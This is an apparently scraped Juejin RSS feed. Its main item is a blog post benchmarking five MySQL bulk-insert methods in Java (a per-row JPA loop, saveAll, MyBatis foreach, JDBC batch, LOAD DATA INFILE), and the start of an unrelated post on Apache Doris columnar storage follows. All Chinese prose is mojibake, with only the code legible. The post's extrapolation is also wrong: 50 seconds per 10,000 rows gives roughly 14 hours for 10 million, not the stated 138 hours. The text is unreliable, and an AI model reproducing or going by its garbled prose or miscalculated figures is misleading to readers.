<p>å¦‚æœä½ è¿˜åœ¨ç”¨ <code>for</code> å¾ªç¯å•æ¡æ’å…¥ï¼Œé‚£è¿™ç¯‡é€šè¿‡å®æµ‹æ•°æ®è¯´è¯çš„æ–‡ç« ï¼Œç»å¯¹èƒ½å¸®ä½ æ‰“å¼€æ–°ä¸–ç•Œçš„å¤§é—¨ã€‚ä»Šå¤©æˆ‘ä»¬å°±ä»¥ <strong>MySQL</strong> ä¸ºä¾‹ï¼Œå®æµ‹å¯¹æ¯” <strong>5 ç§</strong> å¸¸è§çš„æ’å…¥æ–¹å¼ï¼Œçœ‹çœ‹è°æ‰æ˜¯çœŸæ­£çš„â€œæ€§èƒ½ä¹‹ç‹â€ã€‚</p>
<h2 data-id="heading-0">ğŸ› ï¸ æµ‹è¯•ç¯å¢ƒä¸å‡†å¤‡</h2>
<p>ä¸ºäº†ä¿è¯æµ‹è¯•çš„å…¬å¹³æ€§ï¼Œæˆ‘ä»¬ç»Ÿä¸€æµ‹è¯•ç¯å¢ƒï¼š</p>
<ul>
<li><strong>æ•°æ®åº“</strong>ï¼šMySQL 8.0 (Docker éƒ¨ç½²)</li>
<li><strong>ORM æ¡†æ¶</strong>ï¼šSpring Data JPA (Hibernate) / MyBatis / JDBC</li>
<li><strong>æµ‹è¯•æ•°æ®é‡</strong>ï¼š1000 ä¸‡æ¡ (åˆ†æ‰¹æ¬¡æµ‹è¯•)</li>
<li><strong>è¡¨ç»“æ„</strong>ï¼šä¸€å¼ ç®€å•çš„ç”¨æˆ·è¡¨ <code>user</code> (id, username, password, email, create_time)</li>
</ul>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `<span class="hljs-keyword">user</span>` (
  `id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT,
  `username` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,
  `password` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,
  `email` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,
  `create_time` datetime <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,
  <span class="hljs-keyword">PRIMARY</span> KEY (`id`)
) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8mb4;
</code></pre>
<h2 data-id="heading-1">1. ğŸ¢ é’é“œé€‰æ‰‹ï¼šFor å¾ªç¯å•æ¡ Insert</h2>
<p>è¿™æ˜¯æœ€ç›´è§‚ã€æœ€å®¹æ˜“æƒ³åˆ°çš„æ–¹å¼ï¼Œä¹Ÿæ˜¯æ€§èƒ½æœ€å·®çš„æ–¹å¼ã€‚</p>
<p><strong>ä»£ç ç¤ºä¾‹ (JPA):</strong></p>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertOneByOne</span><span class="hljs-params">(List&lt;User&gt; users)</span> {
    <span class="hljs-keyword">for</span> (User user : users) {
        userRepository.save(user);
    }
}
</code></pre>
<p><strong>åŸç†åˆ†æ</strong>ï¼š<br/>
æ¯ä¸€æ¬¡Â saveÂ æ“ä½œï¼Œéƒ½ä¼šå»ºç«‹ä¸€æ¬¡æ•°æ®åº“è¿æ¥ï¼Œå‘é€ SQLï¼Œæ‰§è¡Œï¼Œæäº¤äº‹åŠ¡ï¼Œå…³é—­è¿æ¥ã€‚<br/>
1000 ä¸‡æ¬¡ç½‘ç»œ I/O + 1000 ä¸‡æ¬¡äº‹åŠ¡å¼€é”€ =Â <strong>ç¾éš¾</strong>ã€‚</p>
<p><strong>å®æµ‹ç»“æœ</strong>ï¼š<br/>
æ’å…¥ 1 ä¸‡æ¡æ•°æ®è€—æ—¶çº¦Â <strong>50 ç§’</strong>ã€‚<br/>
æ¨ç®—æ’å…¥ 1000 ä¸‡æ¡æ•°æ®éœ€è¦Â <strong>138 å°æ—¶</strong>Â (çº¦ 5.7 å¤©)ã€‚<br/>
<strong>è¯„ä»·</strong>ï¼šé™¤éä½ æ˜¯åœ¨å†™ Hello Worldï¼Œå¦åˆ™<strong>ä¸¥ç¦</strong>åœ¨ç”Ÿäº§ç¯å¢ƒä½¿ç”¨ã€‚</p>
<h2 data-id="heading-2">2. ğŸ¥ˆ ç™½é“¶é€‰æ‰‹ï¼šJPA çš„Â saveAllÂ (ä¼ªæ‰¹é‡)</h2>
<p>Spring Data JPA æä¾›äº†Â saveAllÂ æ–¹æ³•ï¼Œçœ‹èµ·æ¥åƒæ˜¯æ‰¹é‡æ“ä½œï¼Œä½†çœŸçš„å¿«å—ï¼Ÿ</p>
<p><strong>ä»£ç ç¤ºä¾‹:</strong></p>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">saveAll</span><span class="hljs-params">(List&lt;User&gt; users)</span> {
    userRepository.saveAll(users);
}
</code></pre>
<p><strong>åŸç†åˆ†æ</strong>ï¼š<br/>
é»˜è®¤é…ç½®ä¸‹ï¼ŒHibernate çš„Â saveAllÂ å…¶å®è¿˜æ˜¯<strong>å¾ªç¯è°ƒç”¨Â save</strong>ã€‚è™½ç„¶å®ƒåœ¨ä¸€ä¸ªäº‹åŠ¡ä¸­æ‰§è¡Œï¼Œå‡å°‘äº†äº‹åŠ¡æäº¤çš„æ¬¡æ•°ï¼Œä½† SQL ä¾ç„¶æ˜¯ä¸€æ¡ä¸€æ¡å‘çš„ã€‚<br/>
INSERT INTO user ...<br/>
INSERT INTO user ...</p>
<p><strong>å®æµ‹ç»“æœ</strong>ï¼š<br/>
æ’å…¥ 10 ä¸‡æ¡æ•°æ®è€—æ—¶çº¦Â <strong>12 ç§’</strong>ã€‚<br/>
æ¨ç®— 1000 ä¸‡æ¡æ•°æ®éœ€è¦Â <strong>20 åˆ†é’Ÿ</strong>ã€‚<br/>
<strong>è¯„ä»·</strong>ï¼šæ¯”å•æ¡å¿«äº†ä¸å°‘ï¼Œä½†ä¾ç„¶ä¸å¤Ÿçœ‹ã€‚</p>
<p><strong>ğŸ’¡ ä¼˜åŒ– Tip</strong>ï¼š<br/>
å¯ä»¥é€šè¿‡é…ç½®Â spring.jpa.properties.hibernate.jdbc.batch_size=1000Â å¼€å¯ Hibernate çš„æ‰¹é‡æ’å…¥æ”¯æŒï¼Œæ€§èƒ½ä¼šæœ‰æ‰€æå‡ï¼Œä½†ä¾ç„¶å—é™äº Hibernate çš„ä¸€çº§ç¼“å­˜æœºåˆ¶ï¼Œå†…å­˜å ç”¨è¾ƒé«˜ã€‚</p>
<h2 data-id="heading-3">3. ğŸ¥‡ é»„é‡‘é€‰æ‰‹ï¼šMyBatis çš„Â foreachÂ æ‹¼æ¥ SQL</h2>
<p>è¿™æ˜¯ MyBatis ç”¨æˆ·æœ€å¸¸ç”¨çš„æ‰¹é‡æ’å…¥æ–¹å¼ã€‚</p>
<p><strong>ä»£ç ç¤ºä¾‹ (XML):</strong></p>
<pre><code class="hljs language-Xml" lang="Xml"><span class="hljs-tag">&lt;<span class="hljs-name">insert</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"batchInsert"</span>&gt;</span>
  INSERT INTO user (username, password, email, create_time) VALUES
  <span class="hljs-tag">&lt;<span class="hljs-name">foreach</span> <span class="hljs-attr">collection</span>=<span class="hljs-string">"list"</span> <span class="hljs-attr">item</span>=<span class="hljs-string">"item"</span> <span class="hljs-attr">separator</span>=<span class="hljs-string">","</span>&gt;</span>
    (#{item.username}, #{item.password}, #{item.email}, #{item.createTime})
  <span class="hljs-tag">&lt;/<span class="hljs-name">foreach</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">insert</span>&gt;</span>
</code></pre>
<p><strong>åŸç†åˆ†æ</strong>ï¼š<br/>
è¿™ç§æ–¹å¼ä¼šç”Ÿæˆä¸€æ¡å·¨é•¿çš„ SQLï¼š<br/>
INSERT INTO user (...) VALUES (...), (...), (...);<br/>
æ•°æ®åº“åªéœ€è¦è§£æä¸€æ¬¡ SQLï¼Œæ„å»ºä¸€æ¬¡æ‰§è¡Œè®¡åˆ’ï¼Œå¤§å¤§å‡å°‘äº†ç½‘ç»œ I/O å’Œæ•°æ®åº“è§£æå¼€é”€ã€‚</p>
<p><strong>å®æµ‹ç»“æœ</strong>ï¼š<br/>
æ’å…¥ 10 ä¸‡æ¡æ•°æ®è€—æ—¶çº¦Â <strong>2-3 ç§’</strong>ã€‚<br/>
æ¨ç®— 1000 ä¸‡æ¡æ•°æ®éœ€è¦Â <strong>3-5 åˆ†é’Ÿ</strong>ã€‚<br/>
<strong>è¯„ä»·</strong>ï¼šæ€§èƒ½éå¸¸ä¸é”™ï¼Œæ˜¯æ—¥å¸¸å¼€å‘çš„é¦–é€‰ã€‚</p>
<p><strong>âš ï¸ æ³¨æ„</strong>ï¼š</p>
<ul>
<li><strong>SQL é•¿åº¦é™åˆ¶</strong>ï¼šMySQL å¯¹ SQL è¯­å¥é•¿åº¦æœ‰é™åˆ¶ (max_allowed_packet)ï¼Œé»˜è®¤ 4MBã€‚å¦‚æœä¸€æ¬¡æ‹¼æ¥å¤ªå¤šæ•°æ®ï¼Œä¼šæŠ¥é”™ã€‚å»ºè®®åˆ†æ‰¹ï¼Œæ¯æ‰¹ 1000-5000 æ¡ã€‚</li>
<li><strong>è§£ææˆæœ¬</strong>ï¼šMyBatis è§£æåŠ¨æ€ SQL ä¹Ÿéœ€è¦æ—¶é—´ï¼Œæ•°æ®é‡è¿‡å¤§æ—¶è§£æä¼šå˜æ…¢ã€‚</li>
</ul>
<h2 data-id="heading-4">4. ğŸ’ é’»çŸ³é€‰æ‰‹ï¼šåŸç”Ÿ JDBC Batch</h2>
<p>å›å½’æœ¬è´¨ï¼Œä½¿ç”¨æœ€åº•å±‚çš„ JDBC æ‰¹å¤„ç†ã€‚</p>
<p><strong>ä»£ç ç¤ºä¾‹:</strong></p>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">jdbcBatchInsert</span><span class="hljs-params">(List&lt;User&gt; users)</span> {
    <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">"INSERT INTO user (username, password, email, create_time) VALUES (?, ?, ?, ?)"</span>;
    <span class="hljs-keyword">try</span> (<span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> dataSource.getConnection();
         <span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">ps</span> <span class="hljs-operator">=</span> conn.prepareStatement(sql)) {
        conn.setAutoCommit(<span class="hljs-literal">false</span>); <span class="hljs-comment">// å¼€å¯äº‹åŠ¡</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; users.size(); i++) {
            <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> users.get(i);
            ps.setString(<span class="hljs-number">1</span>, user.getUsername());
            <span class="hljs-comment">// ... è®¾ç½®å…¶ä»–å‚æ•°</span>
            ps.addBatch();
            <span class="hljs-keyword">if</span> ((i + <span class="hljs-number">1</span>) % <span class="hljs-number">1000</span> == <span class="hljs-number">0</span>) {
                ps.executeBatch(); <span class="hljs-comment">// æ‰§è¡Œæ‰¹å¤„ç†</span>
                ps.clearBatch();
            }
        }
        ps.executeBatch(); <span class="hljs-comment">// å¤„ç†å‰©ä½™æ•°æ®</span>
        conn.commit();
    } <span class="hljs-keyword">catch</span> (Exception e) {
        e.printStackTrace();
    }
}
</code></pre>
<p><strong>å…³é”®é…ç½®</strong>ï¼š<br/>
è¿æ¥å­—ç¬¦ä¸²å¿…é¡»åŠ ä¸ŠÂ rewriteBatchedStatements=trueï¼Œå¦åˆ™Â executeBatchÂ ä¾ç„¶æ˜¯ä¸€æ¡æ¡å‘é€ï¼<br/>
jdbc:mysql://localhost:3306/test?rewriteBatchedStatements=true</p>
<p><strong>åŸç†åˆ†æ</strong>ï¼š<br/>
å¼€å¯Â rewriteBatchedStatementsÂ åï¼ŒMySQL é©±åŠ¨ä¼šåœ¨å®¢æˆ·ç«¯å°†å¤šæ¡Â INSERTÂ è¯­å¥é‡å†™ä¸ºÂ INSERT ... VALUES (...), (...)Â çš„å½¢å¼ã€‚ç›¸æ¯” MyBatisï¼Œå®ƒçœå»äº†æ¡†æ¶è§£æ XML å’Œæ˜ å°„å¯¹è±¡çš„å¼€é”€ã€‚</p>
<p><strong>å®æµ‹ç»“æœ</strong>ï¼š<br/>
æ’å…¥ 10 ä¸‡æ¡æ•°æ®è€—æ—¶çº¦Â <strong>1.5 ç§’</strong>ã€‚<br/>
æ¨ç®— 1000 ä¸‡æ¡æ•°æ®éœ€è¦Â <strong>2.5 åˆ†é’Ÿ</strong>ã€‚<br/>
<strong>è¯„ä»·</strong>ï¼šæ€§èƒ½æè‡´ï¼Œå†…å­˜å ç”¨ä½ï¼Œé€‚åˆå¯¹æ€§èƒ½æœ‰æé«˜è¦æ±‚çš„åœºæ™¯ã€‚</p>
<h2 data-id="heading-5">5. ğŸ‘‘ ç‹è€…é€‰æ‰‹ï¼šMySQLÂ LOAD DATA INFILE</h2>
<p>å¦‚æœè¯´å‰é¢çš„éƒ½æ˜¯åœ¨â€œå†™ä»£ç â€ï¼Œé‚£è¿™ä¸ªå°±æ˜¯åœ¨â€œå¼€æŒ‚â€ã€‚è¿™æ˜¯ MySQL å®˜æ–¹æä¾›çš„æ–‡ä»¶å¯¼å…¥å‘½ä»¤ã€‚</p>
<p><strong>ä»£ç ç¤ºä¾‹:</strong></p>
<pre><code class="hljs language-SQL" lang="SQL">LOAD DATA INFILE <span class="hljs-string">'/data/users.csv'</span>
<span class="hljs-keyword">INTO</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-keyword">user</span>
FIELDS TERMINATED <span class="hljs-keyword">BY</span> <span class="hljs-string">','</span> 
LINES TERMINATED <span class="hljs-keyword">BY</span> <span class="hljs-string">'\n'</span>
(username, password, email, create_time);
</code></pre>
<p><strong>åŸç†åˆ†æ</strong>ï¼š<br/>
ç›´æ¥è¯»å–æ–‡ä»¶æµï¼Œç»•è¿‡äº† SQL è§£æå±‚ï¼Œç›´æ¥æ“ä½œå­˜å‚¨å¼•æ“ã€‚è¿™æ˜¯æ•°æ®åº“å¯¼å…¥æ•°æ®çš„<strong>æœ€å¿«æ–¹å¼</strong>ï¼Œæ²¡æœ‰ä¹‹ä¸€ã€‚</p>
<p><strong>å®æµ‹ç»“æœ</strong>ï¼š<br/>
æ’å…¥ 1000 ä¸‡æ¡æ•°æ®è€—æ—¶çº¦Â <strong>1-2 åˆ†é’Ÿ</strong>Â (å–å†³äºç£ç›˜ IO)ã€‚<br/>
<strong>è¯„ä»·</strong>ï¼šé™ç»´æ‰“å‡»ã€‚</p>
<p><strong>ç¼ºç‚¹</strong>ï¼š</p>
<ul>
<li>éœ€è¦å…ˆç”Ÿæˆæ–‡ä»¶ï¼ˆCSV/TXTï¼‰ã€‚</li>
<li>éœ€è¦æ•°æ®åº“æœåŠ¡å™¨çš„æ–‡ä»¶è¯»å–æƒé™ã€‚</li>
<li>é€»è¾‘è¾ƒæ­»æ¿ï¼Œä¸é€‚åˆå¤æ‚çš„ä¸šåŠ¡æ ¡éªŒã€‚</li>
</ul>
<h2 data-id="heading-6">ğŸ“Š æœ€ç»ˆæ’è¡Œæ¦œ (1000 ä¸‡æ•°æ®ä¼°ç®—)</h2>





















































<table><thead><tr><th>æ’å</th><th>æ–¹å¼</th><th>è€—æ—¶ä¼°ç®—</th><th>å¤æ‚åº¦</th><th>æ¨èæŒ‡æ•°</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td><strong>1</strong></td><td><strong>LOAD DATA INFILE</strong></td><td><strong>~1 åˆ†é’Ÿ</strong></td><td>é«˜ (éœ€æ–‡ä»¶)</td><td>â­â­â­</td><td>ç¦»çº¿æ•°æ®è¿ç§»ã€åˆå§‹åŒ–</td></tr><tr><td><strong>2</strong></td><td><strong>JDBC Batch</strong></td><td><strong>~2.5 åˆ†é’Ÿ</strong></td><td>ä¸­</td><td>â­â­â­â­â­</td><td>é«˜æ€§èƒ½ä¸šåŠ¡ä»£ç </td></tr><tr><td><strong>3</strong></td><td><strong>MyBatis Foreach</strong></td><td><strong>~4 åˆ†é’Ÿ</strong></td><td>ä½</td><td>â­â­â­â­</td><td>æ—¥å¸¸æ‰¹é‡æ“ä½œ (ä¸­å°æ•°æ®é‡)</td></tr><tr><td><strong>4</strong></td><td><strong>JPA saveAll</strong></td><td><strong>~20 åˆ†é’Ÿ</strong></td><td>æä½</td><td>â­â­</td><td>å°‘é‡æ•°æ®ï¼Œå·æ‡’ä¸“ç”¨</td></tr><tr><td><strong>5</strong></td><td><strong>For å¾ªç¯å•æ’</strong></td><td><strong>~5.7 å¤©</strong></td><td>ä½</td><td>â˜ ï¸</td><td><strong>ç¦»èŒå‰ä»¥æ­¤ä»£ç äº¤æ¥</strong></td></tr></tbody></table>
<h2 data-id="heading-7">ğŸ’¡ æ€»ç»“ä¸å»ºè®®</h2>
<ol>
<li><strong>æ—¥å¸¸å¼€å‘ (å‡ åƒ/å‡ ä¸‡æ¡)</strong> ï¼šç›´æ¥ç”¨Â <strong>MyBatisÂ foreach</strong>ï¼Œç®€å•æ–¹ä¾¿ï¼Œæ€§èƒ½è¶³å¤Ÿã€‚è®°å¾—åˆ†æ‰¹ï¼ˆæ¯æ‰¹ 1000 æ¡å·¦å³ï¼‰ã€‚</li>
<li><strong>é«˜æ€§èƒ½è¦æ±‚ (å‡ åä¸‡/ç™¾ä¸‡æ¡)</strong> ï¼šä½¿ç”¨Â <strong>JDBC Batch</strong>ï¼Œå¹¶å¼€å¯Â rewriteBatchedStatements=trueã€‚</li>
<li><strong>æµ·é‡æ•°æ®è¿ç§» (åƒä¸‡/äº¿çº§)</strong> ï¼šåˆ«çŠ¹è±«ï¼Œç”Ÿæˆ CSV æ–‡ä»¶ï¼Œç”¨Â <strong>LOAD DATA INFILE</strong>ã€‚</li>
<li><strong>æ°¸è¿œä¸è¦</strong>åœ¨å¾ªç¯é‡Œå†™ SQL æ’å…¥ï¼</li>
</ol>
<p>å¸Œæœ›è¿™ç¯‡æ–‡ç« èƒ½å¸®ä½ é¿å¼€æ€§èƒ½å‘ï¼Œæˆä¸ºå›¢é˜Ÿé‡Œçš„â€œæ€§èƒ½ä¼˜åŒ–å¤§å¸ˆâ€ï¼è§‰å¾—æœ‰ç”¨ç‚¹ä¸ªèµå§ ğŸ‘</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±å…¥dorisæŸ¥è¯¢è®¡åˆ’ä»¥åŠioè°ƒåº¦ï¼ˆäº”ï¼‰åˆ—å¼å­˜å‚¨ç»“æ„ - åˆ†æSegmentæ ¼å¼ã€åˆ—æ•°æ®ç¼–ç ]]></title>    <link>https://juejin.cn/post/7592524811861360674</link>    <guid>https://juejin.cn/post/7592524811861360674</guid>    <pubDate>2026-01-08T03:49:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592524811861360674" data-draft-id="7592515924700725283" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±å…¥dorisæŸ¥è¯¢è®¡åˆ’ä»¥åŠioè°ƒåº¦ï¼ˆäº”ï¼‰åˆ—å¼å­˜å‚¨ç»“æ„ - åˆ†æSegmentæ ¼å¼ã€åˆ—æ•°æ®ç¼–ç "/> <meta itemprop="keywords" content="æ•°æ®åº“"/> <meta itemprop="datePublished" content="2026-01-08T03:49:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è¯­è½å¿ƒç”Ÿ"/> <meta itemprop="url" content="https://juejin.cn/user/2875978147955741"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±å…¥dorisæŸ¥è¯¢è®¡åˆ’ä»¥åŠioè°ƒåº¦ï¼ˆäº”ï¼‰åˆ—å¼å­˜å‚¨ç»“æ„ - åˆ†æSegmentæ ¼å¼ã€åˆ—æ•°æ®ç¼–ç 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2875978147955741/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è¯­è½å¿ƒç”Ÿ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:49:41.000Z" title="Thu Jan 08 2026 03:49:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»30åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. åˆ—å¼å­˜å‚¨æ¦‚è¿°</h2>
<p>Apache Doris é‡‡ç”¨åˆ—å¼å­˜å‚¨ç»“æ„æ¥ç»„ç»‡æ•°æ®ï¼Œè¿™æ˜¯ OLAP æ•°æ®åº“çš„æ ¸å¿ƒè®¾è®¡ã€‚åˆ—å¼å­˜å‚¨å°†åŒä¸€åˆ—çš„æ•°æ®è¿ç»­å­˜å‚¨ï¼Œå…·æœ‰ä»¥ä¸‹ä¼˜åŠ¿ï¼š</p>
<ol>
<li><strong>é«˜å‹ç¼©ç‡</strong>ï¼šåŒç±»å‹æ•°æ®è¿ç»­å­˜å‚¨ï¼Œé‡å¤å€¼å¤šï¼Œæ˜“äºå‹ç¼©</li>
<li><strong>æŸ¥è¯¢æ€§èƒ½</strong>ï¼šåªè¯»å–éœ€è¦çš„åˆ—ï¼Œå‡å°‘ I/O</li>
<li><strong>å‘é‡åŒ–æ‰§è¡Œ</strong>ï¼šè¿ç»­å­˜å‚¨çš„æ•°æ®é€‚åˆ SIMD æŒ‡ä»¤ä¼˜åŒ–</li>
<li><strong>ç´¢å¼•å‹å¥½</strong>ï¼šå¯ä»¥å¯¹æ¯åˆ—å»ºç«‹å¤šç§ç´¢å¼•ç»“æ„</li>
</ol>
<p>åœ¨ Doris ä¸­ï¼Œåˆ—å¼å­˜å‚¨çš„åŸºæœ¬å•å…ƒæ˜¯ <strong>Segment</strong>ï¼Œå®ƒæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„æ•°æ®æ–‡ä»¶ï¼ŒåŒ…å«äº†ä¸€ä¸ªæ•°æ®åˆ†ç‰‡çš„å®Œæ•´ä¿¡æ¯ã€‚</p>
<h3 data-id="heading-1">1.1 æ ¸å¿ƒæ¦‚å¿µ</h3>
<ul>
<li><strong>Segment</strong>ï¼šåˆ—å¼å­˜å‚¨çš„ç‰©ç†æ–‡ä»¶ï¼Œå¯¹åº”ä¸€ä¸ª <code>.dat</code> æ–‡ä»¶</li>
<li><strong>Page</strong>ï¼šåˆ—æ•°æ®çš„æœ€å°å­˜å‚¨å•å…ƒï¼Œé»˜è®¤ 64KB</li>
<li><strong>Column</strong>ï¼šè¡¨çš„ä¸€ä¸ªå­—æ®µï¼Œåœ¨ Segment ä¸­ç‹¬ç«‹å­˜å‚¨</li>
<li><strong>ColumnWriter/ColumnReader</strong>ï¼šåˆ—æ•°æ®çš„å†™å…¥å’Œè¯»å–æ¥å£</li>
